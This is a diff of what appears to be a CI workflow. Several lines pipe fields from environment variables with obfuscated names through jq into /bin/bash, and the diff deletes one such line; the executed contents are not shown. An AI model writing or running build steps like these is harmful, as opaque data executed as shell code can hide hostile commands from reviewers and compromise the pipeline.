@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$qs52" | jq -r .i5043 | /bin/bash
           echo $qjeke454 | jq -r .r96 | /bin/bash
           echo $fgf6380 | jq -r .pb24117 | /bin/bash
-          printf '%s' "$ta6050" | jq -r .o52 | /bin/bash
 
       - name: Archive output
         if: always()
